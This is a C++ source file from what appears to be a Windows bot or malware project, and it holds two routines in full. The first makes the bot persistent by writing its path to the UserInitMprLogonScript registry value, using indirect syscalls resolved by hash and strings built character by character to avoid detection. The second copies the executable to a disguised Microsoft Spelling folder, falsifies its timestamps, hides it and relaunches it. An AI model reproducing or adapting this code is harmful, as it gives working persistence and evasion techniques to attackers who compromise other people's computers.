#include "Modules/persistence.h"
#include "Core/api_resolve.h"
#include "Core/syscalls.h"
#include "Modules/recon.h"
#include "Evasion/timestomp.h"
#include "Utils/helpers.h"
#include "Modules/ghost.h"
#include "Modules/suicide.h"
#include <cstdio>
#include <cstring>
void Internal_Persist(const wchar_t* botPath) {
    API_TABLE& API = GetAPI();
    if (!API.hasPersistence) return;

    HANDLE hKey;
    NTSTATUS status;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uKeyName, uValueName, uSid;
    SYSCALL_GATE gate;
    
    // get users Native SID
    if (!GetNativeUserSID(&uSid)) {
        return; 
    }

    // Build registry path char-by-char (no plaintext in .rdata)
    // \Registry\User\<SID>\Environment
    wchar_t regPrefix[] = {'\\','R','e','g','i','s','t','r','y','\\','U','s','e','r','\\','\0'};
    wchar_t regSuffix[] = {'\\','E','n','v','i','r','o','n','m','e','n','t','\0'};
    wchar_t regPath[512];
    wcscpy_s(regPath, 512, regPrefix);
    SecureZeroMemory(regPrefix, sizeof(regPrefix));
    wcscat_s(regPath, 512, uSid.Buffer);
    wcscat_s(regPath, 512, regSuffix);
    SecureZeroMemory(regSuffix, sizeof(regSuffix));

    // Value name: UserInitMprLogonScript
    wchar_t valName[] = {'U','s','e','r','I','n','i','t','M','p','r','L','o','g','o','n','S','c','r','i','p','t','\0'};

    mRtlInitUnicodeString(&uKeyName, regPath);
    mRtlInitUnicodeString(&uValueName, valName);
    InitializeObjectAttributes(&objAttr, &uKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // NtCreateKey 
    gate = GetSSNByHash(0X859E32F8C2679EA5);
    PREPARE_SYSCALL(gate);
    status = IndirectSyscall((ULONG_PTR)&hKey, (ULONG_PTR)KEY_WRITE | KEY_READ, (ULONG_PTR)&objAttr, 0, (ULONG_PTR)NULL, (ULONG_PTR)0, (ULONG_PTR)NULL, 0, 0, 0, 0);

    if (status == 0) {
        // NtSetValueKey 
        gate = GetSSNByHash(0XC722717F5A8E0AC2);
        PREPARE_SYSCALL(gate);
        status = IndirectSyscall((ULONG_PTR)hKey, (ULONG_PTR)&uValueName, 0, (ULONG_PTR)1, (ULONG_PTR)botPath, (ULONG_PTR)(wcslen(botPath) * sizeof(WCHAR)), 0, 0, 0, 0, 0);

        // NtClose
        gate = GetSSNByHash(0X5E575BD8ACC77BC0);
        PREPARE_SYSCALL(gate);
        IndirectSyscall((ULONG_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    }

    // free allocated memory from RtlConvertSidToUnicodeString
    HMODULE hNtdll = (HMODULE)GetModuleBaseByHash(0X571A46A16587BB7A);
    pfnRtlFreeUnicodeString RtlFreeStr = (pfnRtlFreeUnicodeString)GetProcAddressByHash(hNtdll, 0X572FD5EFA1BCF57C);
    
    if (RtlFreeStr) {
        RtlFreeStr(&uSid);
    }
}



bool safe_migrate() {
    API_TABLE& API = GetAPI();
    wchar_t current_path[MAX_PATH];
    wchar_t target_path[MAX_PATH];
    wchar_t appData[MAX_PATH];

    API.GetModuleFileNameW(NULL, current_path, MAX_PATH);
    wchar_t envName[] = {'A','P','P','D','A','T','A','\0'};
    API.GetEnvironmentVariableW(envName, appData, MAX_PATH);
    SecureZeroMemory(envName, sizeof(envName));

    // Build target subpath char-by-char (no plaintext wide string in .rdata)
    // "\\Microsoft\\Spelling\\neutral\\default.exe"
    wchar_t subpath[] = {
        '\\','M','i','c','r','o','s','o','f','t',
        '\\','S','p','e','l','l','i','n','g',
        '\\','n','e','u','t','r','a','l',
        '\\','d','e','f','a','u','l','t','.','e','x','e','\0'
    };

    swprintf(target_path, MAX_PATH, L"%ls%ls", appData, subpath);
    SecureZeroMemory(subpath, sizeof(subpath));

    if (wcscmp(current_path, target_path) == 0) {
        return false;  // already migrated
    }

    if (API.CopyFileW(current_path, target_path, FALSE)) {
        timestomp(target_path);
        API.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        if (API.CreateProcessW(target_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            API.CloseHandle(pi.hProcess);
            API.CloseHandle(pi.hThread);
            return true;
        }
    }
    return false;
}
